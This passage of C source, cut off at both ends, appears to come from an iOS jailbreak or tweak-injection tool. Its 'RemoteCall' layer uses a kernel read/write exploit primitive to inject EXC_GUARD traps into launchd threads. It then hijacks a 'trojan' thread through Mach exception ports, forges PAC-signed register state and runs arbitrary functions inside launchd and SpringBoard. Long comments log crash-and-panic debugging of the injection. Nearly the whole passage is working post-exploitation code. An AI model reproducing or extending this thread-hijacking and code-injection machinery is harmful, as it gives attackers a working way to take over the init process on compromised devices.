// an arbitrary pe_main.js constant no real guard violation carries). The
// kernel delivers our written guard_exc_info_code verbatim as the message's
// codeFirst, so a received EXC_GUARD is PROVABLY ours iff it matches. This is
// the responder's ownership gate: it must never mass-answer traps we did not
// arm (a real launchd guard violation or another thread's crash answered with
// its own state resumes the thread into the same fault — the 19:58:34 storm).
static uint64_t rc_injected_guard_code(void)
{
    uint64_t code = 0;
    EXC_GUARD_ENCODE_TYPE(code, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(code, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(code, 0xf503ULL);
    return code;
}

static bool rc_exc_is_own_guard(const ExceptionMessage *e)
{
    if (!e || e->exception != EXC_GUARD) return false;
    uint64_t want = rc_injected_guard_code();
    // Exact match, or at least the distinctive type+target marker if a kernel
    // variant rewrites the flavor bits on delivery.
    return e->codeFirst == want ||
           ((e->codeFirst >> 61) == GUARD_TYPE_MACH_PORT &&
            (e->codeFirst & 0xffffffffULL) == 0xf503ULL);
}

// Round 18: generalized crash re-park. Never reply a crash message with its
// unmodified state (that resumes the thread into the same faulting PC — the
// crash-loop), and never escalate (a failed exception in a launchd thread
// kills launchd). The one safe answer is to re-park into the RPC protocol:
// sign the protocol park PC/LR with the session's CACHED keys and resume the
// thread there; it re-faults on the sentinel by design and waits for the
// next call. If the sign fails (KRW lost), fall back to the unmodified
// state — the port is still ours, so the re-trap comes back to us.
static void rc_reply_crash_repark(ExceptionMessage *e, uint64_t parkPC,
                                  uint64_t parkLR, const char *where)
{
    printf("[RC] CRASH trap (%s) exc=%u code=%#llx/%#llx pc=%#llx — "
           "re-parking into trojan RPC (park=%#llx/%#llx), NOT resuming into "
           "the fault\n",
           where ?: "(unknown)", (unsigned)e->exception,
           (unsigned long long)e->codeFirst, (unsigned long long)e->codeSecond,
           (unsigned long long)e->threadState.__pc,
           (unsigned long long)parkPC, (unsigned long long)parkLR);
    arm_thread_state64_internal st = e->threadState;
    if (sign_state(g_RC_trojanThreadAddr, &st, parkPC, parkLR)) {
        reply_with_state(e, &st);
    } else {
        printf("[RC] re-park sign failed (KRW lost?) — replying unmodified; "
               "re-trap returns to our port\n");
        reply_with_state(e, &e->threadState);
    }
    g_RC_success = false;
}

// A crash on the SECOND port can only be the synthetic call thread.
static void rc_repark_synthetic_thread(ExceptionMessage *e, const char *where)
{
    rc_reply_crash_repark(e, FAKE_PC_TROJAN, FAKE_LR_TROJAN, where);
}

// Round 18: first-port (original-thread / temp-call) counterpart. The trojan
// thread on the first port runs the CREATOR protocol, so a crash re-parks at
// the creator sentinels. An EXC_GUARD message here is NOT a crash — it is a
// late trap from another injected thread; it must be released with its own
// state and must NEVER be dispatched or re-parked (that would hijack a
// random launchd thread into the RPC). Either way the call fails.
static void rc_temp_stray_or_crash_reply(ExceptionMessage *e, const char *where)
{
    if (e->exception == EXC_GUARD) {
        printf("[RC] temp call (%s): late EXC_GUARD stray on first port — "
               "released with own state; call failed, never dispatched on a "
               "stray\n", where ?: "(unknown)");
        reply_with_state(e, &e->threadState);
        g_RC_success = false;
        return;
    }
    rc_reply_crash_repark(e, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR,
                          where);
}

bool remote_call_current_success(void)
{
    return g_RC_success;
}

int remote_call_current_pid(void)
{
    return g_RC_pid;
}

bool remote_call_uses_vphone_bridge(void)
{
    return g_RC_vphoneBridge;
}

int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
{
    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
    return previous;
}

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (!remote_call_kill_args_sane(name, x0, "call-temp")) {
        g_RC_success = false;
        return (uint64_t)-1;
    }
    if (!remote_call_inflight_begin("call-temp")) {
        g_RC_success = false;
        return 0;
    }
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    remote_call_inflight_end("call-temp");
    return res;
}

uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s — call blocked before dispatch\n",
               __FUNCTION__, __LINE__, name ?: "(null)");
        g_RC_success = false;
        return 0;
    }

    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }

    // Round 18: same classification as the stable path. A non-sentinel first
    // message is either a late EXC_GUARD stray from another injected thread
    // (release it with its own state — dispatching on it would hijack a
    // random launchd thread) or the trojan thread CRASHING on the previous
    // dispatch (re-park into the creator protocol, fail the call — never
    // dispatch on top of a crash).
    if (!rc_exc_is_park_trap(&exc)) {
        rc_temp_stray_or_crash_reply(&exc, "call-temp first trap");
        return 0;
    }

    // Pre-dispatch KRW check: signing the dispatch state needs live sockets
    // (remote_pac reads the thread's PAC keys via early_kread, which exit(0)s
    // the process on dead sockets — mid-call that strands this trapped thread).
    // Re-park the thread with its UNMODIFIED trapped state instead.
    if (!kexploit_krw_ready()) {
        reply_with_state(&exc, &exc.threadState);
        g_RC_success = false;
        printf("[RC] KRW LOST before dispatching %s on original thread — thread "
               "re-parked unharmed; call aborted\n", name);
        printf("[RC] self-test: call exited after KRW loss — thread restored=YES\n");
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR)) {
        // KRW died mid-call before the PAC sign — dispatching now would send
        // the launchd thread to a garbage PC. Re-park it with its UNMODIFIED
        // trapped state (it re-traps into the port queue, unharmed).
        reply_with_state(&exc, &exc.threadState);
        g_RC_success = false;
        printf("[RC] self-test: call %s aborted on KRW loss BEFORE dispatch — "
               "thread restored=YES (re-parked with trapped state)\n", name);
        return 0;
    }
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }
    // Round 18: the return trap MUST be the 0x201 creator sentinel. A
    // non-sentinel fault is the trojan thread crashing on the dispatch we
    // just made — x0 of a crash message is an echo of our own argument, NOT
    // a return value, and an own-state reply resumes it into the same
    // faulting PC (the 12:30:56 crash-loop shape, first-port variant).
    // Re-park into the creator protocol and fail loudly.
    if (!rc_exc_is_park_trap(&exc2)) {
        rc_temp_stray_or_crash_reply(&exc2, "call-temp return trap");
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    if (remote_call_should_log_result(name, false))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
    if(strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
    }
    return retValue;
}

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (!remote_call_kill_args_sane(name, x0, "call-stable")) {
        g_RC_success = false;
        return (uint64_t)-1;
    }
    if (!remote_call_inflight_begin("call-stable")) {
        g_RC_success = false;
        return 0;
    }
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = 0;
    if (g_RC_vphoneBridge) {
        if (timeout >= 0)
            res = rc_vphone_bridge_call(2, 0, name, x0, x1, x2, x3, x4, x5, x6, x7);
        pthread_mutex_unlock(&g_universal_ipc_mutex);
        remote_call_inflight_end("call-stable");
        return res;
    }

    if (!g_RC_creatingExtraThread) {
        res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
        pthread_mutex_unlock(&g_universal_ipc_mutex);
        remote_call_inflight_end("call-stable");
        return res;
    }

    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
        g_RC_success = false;
        pthread_mutex_unlock(&g_universal_ipc_mutex);
        remote_call_inflight_end("call-stable");
        return 0;
    }
    res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    remote_call_inflight_end("call-stable");
    return res;
}

uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    // Round 22-regression: the addr path must not bypass the kill() hard-stop.
    if (!remote_call_kill_args_sane(name, x0, "call-stable-addr")) {
        g_RC_success = false;
        return (uint64_t)-1;
    }
    if (!remote_call_inflight_begin("call-stable-addr")) {
        g_RC_success = false;
        return 0;
    }
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    remote_call_inflight_end("call-stable-addr");
    return res;
}

// (Round 17/18 trap-classification helpers moved ahead of
// do_remote_call_temp_internal — both call paths use them now.)

uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (g_RC_vphoneBridge) {
        if (timeout < 0) return 0;
        if (rc_vphone_bridge_unsafe_addr_call_name(name)) {
            printf("[VPHONE-BRIDGE] blocked unsafe addr-call name=%s addr=%#llx\n",
                   name ?: "(null)", pcAddr);
            g_RC_success = false;
            return 0;
        }
        return rc_vphone_bridge_call(3, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    }

    if (!g_RC_creatingExtraThread)
        return 0;

    if (!pcAddr) {
        printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
        g_RC_success = false;
        return 0;
    }
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }

    // Round 17: this trap MUST be a sentinel park trap (0x301/0x401). A
    // non-sentinel fault is the synthetic thread CRASHING on a previous bad
    // dispatch — re-park it and fail the call; never dispatch on top of a
    // crash or read a "return value" out of a crash message (12:30:56: kill
    // "returned" its own x0=0x48d that way).
    if (!rc_exc_is_park_trap(&exc)) {
        rc_repark_synthetic_thread(&exc, "call-stable-addr first trap");
        return 0;
    }

    // Pre-dispatch KRW check (the 17:50:30 panic path): signing needs live
    // sockets; dispatching without them either exit(0)s the process mid-call
    // or sends the launchd thread to a garbage PC. Re-park unharmed instead.
    if (!kexploit_krw_ready()) {
        reply_with_state(&exc, &exc.threadState);
        g_RC_success = false;
        printf("[RC] KRW LOST before dispatching %s on synthetic thread — thread "
               "re-parked unharmed; call aborted\n", name ?: "(addr-call)");
        printf("[RC] self-test: call exited after KRW loss — thread restored=YES\n");
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN)) {
        // KRW died mid-call before the PAC sign — this is exactly the 17:50:30
        // case (live 10.log): a background detach slipped in and the thread was
        // dispatched with PC=-1, killing launchd 25 s later. NEVER dispatch on
        // a failed sign: re-park the thread with its UNMODIFIED trapped state.
        reply_with_state(&exc, &exc.threadState);
        g_RC_success = false;
        printf("[RC] self-test: call %s aborted on KRW loss BEFORE dispatch — "
               "thread restored=YES (re-parked with trapped state)\n",
               name ?: "(addr-call)");
        return 0;
    }
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    // Robust return-trap wait. The trojan thread's LR is FAKE_LR_TROJAN (0x401);
    // if we abandon this wait while that LR is still set, the target eventually
    // returns, branches to 0x401, and crashes the host with SIGBUS at 0x401
    // (seen as SpringBoard crashing minutes after a live-loop tick when the app
    // was briefly suspended/throttled). Instead of giving up after one timeout,
    // keep re-waiting until the trap actually arrives so we always reply cleanly.
    // Bail only if the session is torn down (its exception port is cleared), a
    // stop was requested (backgrounding needs us done NOW), or a generous hard
    // cap is hit (a call that is genuinely stuck).
    ExceptionMessage exc2;
    {
        int robustCapMS = (g_RC_stableExceptionTimeoutFloorMS > 0
                           ? g_RC_stableExceptionTimeoutFloorMS * 12 : 120000);
        int waitedMS = 0;
        bool got = false;
        while (true) {
            got = wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false);
            if (got) break;
            if (g_RC_secondExceptionPort == MACH_PORT_NULL) break; // session torn down
            if (remote_call_stop_requested()) {
                printf("[RC] stop requested during return-trap wait (%s) — aborting call\n",
                       name ?: "(addr-call)");
                break;
            }
            waitedMS += newTimeout;
            if (waitedMS >= robustCapMS) break;                    // genuinely stuck
            printf("[%s:%d] return trap not received yet; re-waiting (%d/%d ms)\n",
                   __FUNCTION__, __LINE__, waitedMS, robustCapMS);
        }
        if (!got) {
            // Defense in depth: if the KRW sockets were torn down underneath
            // this call (should be impossible with the in-flight guard — log
            // loudly if it ever happens), say so distinctly so the log shows
            // exactly why the call failed.
            if (!kexploit_krw_ready())
                printf("[RC] KRW LOST mid-call (%s) — sockets detached underneath an "
                       "in-flight RemoteCall; aborting. Session teardown must still "
                       "restore the trapped thread (Mach IPC only).\n",
                       name ?: "(addr-call)");
            printf("[%s:%d] Don't receive second exception on new thread (gave up)\n",
                   __FUNCTION__, __LINE__);
            g_RC_success = false;
            return 0;
        }
    }
    // Round 17: the return trap MUST be the 0x401 sentinel. A non-sentinel
    // fault here is the synthetic thread crashing on the dispatch we just
    // made — x0 of a crash message is an echo of our own argument, NOT a
    // return value (12:30:56: kill "returned" 0x48d = its pid argument, and
    // replying unmodified resumed it into the same faulting PC — the
    // crash-loop that watchdogged launchd 26 s later). Re-park and fail.
    if (!rc_exc_is_park_trap(&exc2)) {
        rc_repark_synthetic_thread(&exc2, "call-stable-addr return trap");
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    if (remote_call_should_log_result(name, true))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
    return retValue;
}

bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
    // Round 19: the restore reply MUST go to the trojan's own park trap. This
    // used to answer WHATEVER was dequeued first — a late EXC_GUARD stray
    // queued ahead would get the trojan's original state (a random launchd
    // thread resumed onto the trojan's saved stack) while the real trojan
    // stayed parked at the 0x101/0x201 sentinel — the parked thread whose
    // trap ping-ponged the responder 35,349 times at 19:58:34 and whose
    // undeliverable final fault SIGBUSed launchd at 19:58:53 ("initproc
    // exited"). Classify every message; only a sentinel park trap gets the
    // original state. Every reply must carry a FRESH state copy — `state` is
    // caller-owned and reused.
    for (int attempt = 0; attempt < 4; attempt++) {
        ExceptionMessage exc;
        if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
            printf("[%s:%d] Failed to receive exception while restoring within %dms "
                   "(attempt %d) — trojan thread NOT restored\n",
                   __FUNCTION__, __LINE__, restoreTimeoutMS, attempt + 1);
            return false;
        }
        if (rc_exc_is_park_trap(&exc)) {
            // Round 20: NEVER restore to a sentinel. A sentinel "original
            // state" is a stolen park state — replying it would re-park the
            // thread at the sentinel with us believing it restored (071602:
            // restore to 0x3748800000000201, instant re-trap, responder
            // answered once and exited, thread parked with no owner for the
            // 90 s watchdog window). Leave the thread parked (own-state
            // reply keeps the one-reply-per-message accounting) and fail the
            // restore; the caller tears the session down.
            if (rc_pc_is_sentinel(state->__pc)) {
                printf("[RC] thread restore: REFUSING to restore the trojan to "
                       "PROTOCOL SENTINEL pc=%#llx — the saved 'original state' "
                       "is itself a park state (cross-session theft, 071602); "
                       "restoring would re-park it forever\n",
                       (unsigned long long)state->__pc);
                reply_with_state(&exc, &exc.threadState);
                return false;
            }
            state->__flags = exc.threadState.__flags;
            if (!sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr)) {
                // PAC re-sign failed (KRW lost) — reply with the RAW original
                // state instead. Its pc/lr came from the kernel's own trap
                // message (same as the stray-thread drain replies, which work
                // unsigned), so this still restores the thread; skipping the
                // reply would leave it parked.
                printf("[RC] thread restore: re-sign failed — replying RAW original "
                       "state (kernel-trap signed)\n");
            }
            reply_with_state(&exc, state);
            printf("[RC] thread restore: trojan thread resumed with original state\n");
            return true;
        }
        if (exc.exception == EXC_GUARD) {
            // Late stray queued ahead of the trojan's park trap: release it
            // with its OWN state (one-shot by construction) and keep waiting
            // for the real park trap.
            printf("[RC] thread restore: late EXC_GUARD stray released with own "
                   "state while awaiting the trojan's park trap (attempt %d)\n",
                   attempt + 1);
            reply_with_state(&exc, &exc.threadState);
            continue;
        }
        // The trojan (or another injected thread) CRASHED instead of parking:
        // re-park it into the creator protocol; its re-trap arrives as a park
        // trap and the next iteration restores it. (Sets g_RC_success=false —
        // a crashed trojan poisons the session; callers must fail it.)
        rc_reply_crash_repark(&exc, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR,
                              "thread restore");
    }
    printf("[RC] thread restore: no park trap after 4 attempts — trojan thread "
           "NOT restored\n");
    return false;
}

// Drain and answer any queued traps with each thread's OWN trapped state (pure
// Mach IPC — no KRW, no PAC: the trapped state came from the kernel's own trap
// message and replays unsigned, same as the init stray-drain). A thread left
// parked in our exception port at teardown waits on a reply whose send-once
// right dies with the port — the hung launchd thread watchdogs the device into
// "initproc exited" ~22 s later. Runs before port destruction in BOTH destroy
// and abandon so teardown leaves zero trapped threads behind, and the count is
// logged as the guard-injection symmetry check.
// Round 8: validate an injection-walk candidate IMMEDIATELY before any write
// to its object. Launchd's thread list churns constantly — slots read a moment
// ago may already be freed (threads-zone use-after-free:
// panic-full-2026-09-29-215904, 25 s after a hijack walked 10 dead slots).
// Checks: valid kernel pointer, ksafe-mapped object, a nonzero sanity field
// (t_tro), and the owning task re-read and compared to the target's task.
// Four cheap reads; narrows the check→write race to microseconds. It cannot
// eliminate the race outright — inject_guard_exception's snapshot/verify/
// rollback covers what gets through.
static bool rc_validate_target_thread(uint64_t thread, uint64_t expectTask)
{
    if (!is_kaddr_valid(thread)) return false;
    if (ksafe_available() && !kaddr_is_mapped(thread, 8)) return false;
    if (!is_kaddr_valid(thread_get_t_tro(thread))) return false;   // sanity field
    return thread_get_task(thread) == expectTask;                  // re-read owner
}

// Rate-limited skip accounting for the injection walk: the first few skips
// say why, the rest are counted and summarized at walk end (the 21:58 session
// logged 10 near-identical lines for one dead slot).
static void rc_note_walk_skip(const char *why, int *skipCount)
{
    (*skipCount)++;
    if (*skipCount <= 3) {
        printf("[RC] walk: candidate skipped (%s) — freed/dead slot, no writes "
               "(%d so far)\n", why, *skipCount);
    } else if (*skipCount == 4) {
        printf("[RC] walk: further candidate skips silenced (rate limit) — "
               "count in walk summary\n");
    }
}

// Round 7: late-trap responder. With 6 injected launchd threads (was 2), some
// trap AFTER init's short drain window; unanswered, their exception messages
// would sit on the first port for the session's whole life and those launchd
// threads would stay parked until teardown. This responder services the first
// port for the session's lifetime, answering each late trap with its own
// state. Pure Mach IPC: no KRW, no RemoteCall state reads (the state pointer
// is per-thread and the owning session can be freed under us — the port value
// is captured up front), no detach-gate interaction. Safe to race the teardown
// drain: each message is delivered to exactly one waiter, and the reply is
// identical from either.
//
// Exit condition is PORT DEATH, not a session-global flag: a SpringBoard tweak
// session and the fastkill launchd session can be alive simultaneously, each
// with its own first port and its own responder, so a shared "stop" flag would
// kill the wrong responder. Both teardown paths destroy the port, which fails
// the wait; the 1 s timeout just bounds how long an idle responder lingers.
// (If the kernel recycles the dead port NAME into the next session's port
// before this thread notices, it may answer that session's traps meanwhile —
// the reply is session-agnostic, so that is harmless.)
// Round 7: late-trap responder. With 6 injected launchd threads (was 2), some
// trap AFTER init's short drain window; unanswered, their exception messages
// would sit on the first port for the session's whole life and those launchd
// threads would stay parked until teardown. This responder services the first
// port for the session's lifetime, answering each late trap with its own
// state. Pure Mach IPC: no KRW, no RemoteCall state reads (the state pointer
// is per-thread and the owning session can be freed under us — the port value
// is captured up front), no detach-gate interaction. Safe to race the teardown
// drain: each message is delivered to exactly one waiter, and the reply is
// identical from either.
//
// Exit condition is PORT DEATH, not a session-global flag: a SpringBoard tweak
// session and the fastkill launchd session can be alive simultaneously, each
// with its own first port and its own responder, so a shared "stop" flag would
// kill the wrong responder. Both teardown paths destroy the port, which fails
// the wait; the 1 s timeout just bounds how long an idle responder lingers.
// (If the kernel recycles the dead port NAME into the next session's port
// before this thread notices, it may answer that session's traps meanwhile —
// with the round-19 ownership gate that is harmless: it only answers traps
// provably armed by us, exactly once each.)
//
// Round 19: OWNERSHIP GATE + NO RE-TRAP LOOP. The pre-19 responder answered
// EVERY dequeued message with its own state. For a sentinel park trap that
// answer resumes the thread at the sentinel PC, which re-faults instantly and
// re-traps — an unanswered-forever ping-pong: at 19:58:34 this loop ran
// 35,349 times in 347 ms against a launchd thread whose setup restore had
// silently failed, and when teardown destroyed the port mid-loop the thread's
// final fault was undeliverable — launchd took SIGBUS and the device panicked
// "initproc exited" 19 s later. So:
//   - EXC_GUARD carrying OUR injected guard code: a late injected trap,
//     one-shot by construction (the AST is consumed on delivery). Answer with
//     own state. This is the ONLY message this responder may answer.
//   - a sentinel PARK TRAP: a protocol thread parked outside any in-flight
//     call (its restore failed, or the between-calls idle trap landed on the
//     wrong consumer). Answer EXACTLY ONCE — every dequeued message must get
//     one reply, or the thread is parked on a message the teardown drain can
//     no longer see — then EXIT: the re-fault re-queues the trap for the
//     proper consumer (a call's wait, or the teardown drain, which restores
//     parked threads with their ORIGINAL state). Looping here is the storm.
//   - anything else: a genuinely crashed thread; an own-state loop would
//     crash-loop it. Answer once, scream, exit.
static void *rc_firstport_responder_main(void *arg)
{
    mach_port_t port = (mach_port_t)(uintptr_t)arg;
    int answered = 0;
    for (;;) {
        ExceptionMessage stray;
        if (wait_exception(port, &stray, 1000, false)) {
            if (rc_exc_is_own_guard(&stray)) {
                reply_with_state(&stray, &stray.threadState);
                answered++;
                // Round 19: rate-limited — an unbounded printf per answer is
                // what turned the 19:58:34 ping-pong into a 4 MB/360 ms log
                // flood that rotated the live log away from its own cause.
                if (answered <= 3 || (answered % 1000) == 0) {
                    printf("[RC] responder: late trap on first port answered with "
                           "own state (injected thread resumed) — %d total\n",
                           answered);
                }
                continue;
            }
            printf("[RC] responder: %s on first port (exc=%u code=%#llx/%#llx "
                   "pc=%#llx) — NOT one of our injected late traps; answered "
                   "ONCE, responder exiting (the protocol waits and the "
                   "teardown drain own this thread from here); session marked "
                   "ANOMALOUS — the kill path tears it down instead of "
                   "reusing or keeping it warm (071602: a warm session with a "
                   "dead responder and a parked launchd worker is the "
                   "watchdog-timeout bomb)\n",
                   rc_exc_is_park_trap(&stray)
                       ? "PARK TRAP (protocol thread parked outside any call)"
                       : "NON-PROTOCOL TRAP (launchd thread crashed)",
                   (unsigned)stray.exception,
                   (unsigned long long)stray.codeFirst,
                   (unsigned long long)stray.codeSecond,
                   (unsigned long long)stray.threadState.__pc);
            reply_with_state(&stray, &stray.threadState);
            rc_anomalous_port_mark(port);   // round 20
            break;
        }
        mach_port_type_t type;
        if (mach_port_type(mach_task_self_, port, &type) != KERN_SUCCESS)
            break;   // port destroyed — session was torn down
    }
    return NULL;
}

static void rc_start_firstport_responder(mach_port_t port)
{
    if (!MACH_PORT_VALID(port)) return;
    pthread_t t;
    if (pthread_create(&t, NULL, rc_firstport_responder_main,
                       (void *)(uintptr_t)port) == 0) {
        pthread_detach(t);
        printf("[RC] first-port responder started — late traps answered for the "
               "session's life\n");
    }
}

// Round 7 warm-up telemetry (exported via RemoteCall.h): stats of the most
// recent init_remote_call — how many threads got the EXC_GUARD injection and
// how long the first-trap wait took.
static int g_RC_lastInitInjected = 0;
static uint64_t g_RC_lastInitTrapMs = 0;
int remote_call_last_init_injected(void) { return g_RC_lastInitInjected; }
uint64_t remote_call_last_init_trap_ms(void) { return g_RC_lastInitTrapMs; }

// Round 19: the drain is now ownership-aware. A sentinel park trap at teardown
// is a PARKED PROTOCOL THREAD, not a stray: on the FIRST port it is the trojan
// thread whose setup restore never landed; on the SECOND port it is the
// synthetic call thread still parked (its pthread_exit dispatch failed). The
// old own-state reply resumed such threads at the sentinel PC — the re-fault
// then landed on a port seconds from destruction, an undeliverable exception
// that exits launchd ~19-22 s later ("initproc exited"; 19:58:34.733 teardown
// → 19:58:53 panic). The correct replies: the trojan gets its ORIGINAL state
// (signed; raw kernel-trap state as fallback, same as restore_trojan_thread);
// the synthetic thread gets a pthread_exit(0) dispatch; when neither is
// possible (no restore data, KRW lost), the trap is left UNANSWERED — a parked
// synthetic thread is an inert leak (it holds no launchd locks), strictly
// safer than resuming any thread into a dying port.
// Round 22-regression: threads this teardown LEFT PARKED (trap consumed from
// the port but never answered because no restore/dispatch path could sign).
// rc_teardown_verify_zero_parked only counts UNCONSUMED messages, so without
// this counter it reported "INVARIANT holds" while a launchd thread sat
// parked at a sentinel — exactly the 123329/123448 landmine. Incremented by
// the drain, read+reset by the verify pass.
static volatile int g_rc_teardown_left_parked = 0;

static int rc_drain_stray_traps(mach_port_t port, const char *tag, int *outParked) {
    if (outParked) *outParked = 0;
    if (!MACH_PORT_VALID(port)) return 0;
    int n = 0;
    int crashes = 0;
    int parked = 0;
    bool restoredTrojan = false;
    bool exitedSynthetic = false;
    for (int i = 0; i < 8; i++) {
        ExceptionMessage stray;
        if (!wait_exception(port, &stray, 150, false)) break;
        if (rc_exc_is_park_trap(&stray)) {
            parked++;
            if (port == g_RC_firstExceptionPort && !restoredTrojan &&
                g_RC_trojanThreadAddr && g_RC_originalState.__pc &&
                !rc_pc_is_sentinel(g_RC_originalState.__pc)) {
                arm_thread_state64_internal st = g_RC_originalState;
                st.__flags = stray.threadState.__flags;
                if (!sign_state(g_RC_trojanThreadAddr, &st, st.__pc, st.__lr))
                    printf("[RC] teardown drain: trojan restore re-sign failed — "
                           "replying RAW original state (kernel-trap signed)\n");
                reply_with_state(&stray, &st);
                restoredTrojan = true;
                n++;
                printf("[RC] TEARDOWN INVARIANT REPAIR: park trap on %s "
                       "(pc=%#llx) = trojan thread was never restored — resumed "
                       "with its ORIGINAL state now; no launchd thread left "
                       "parked at a protocol sentinel\n",
                       tag, (unsigned long long)stray.threadState.__pc);
                continue;
            }
            if (port == g_RC_secondExceptionPort && !exitedSynthetic) {
                uint64_t exitAddr = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
                arm_thread_state64_internal st = stray.threadState;
                st.__x[0] = 0;
                // Round 22: LR = signed pthread_exit too — a pthread_exit that
                // RETURNS must re-enter itself, never branch to the 0x401
                // sentinel on a port that is seconds from destruction.
                if (exitAddr && g_RC_trojanThreadAddr &&
                    sign_state(g_RC_trojanThreadAddr, &st, exitAddr, exitAddr)) {
                    reply_with_state(&stray, &st);
                    exitedSynthetic = true;
                    n++;
                    printf("[RC] TEARDOWN INVARIANT REPAIR: park trap on %s = "
                           "synthetic call thread still parked — pthread_exit(0) "
                           "dispatched from the drain\n", tag);
                } else {
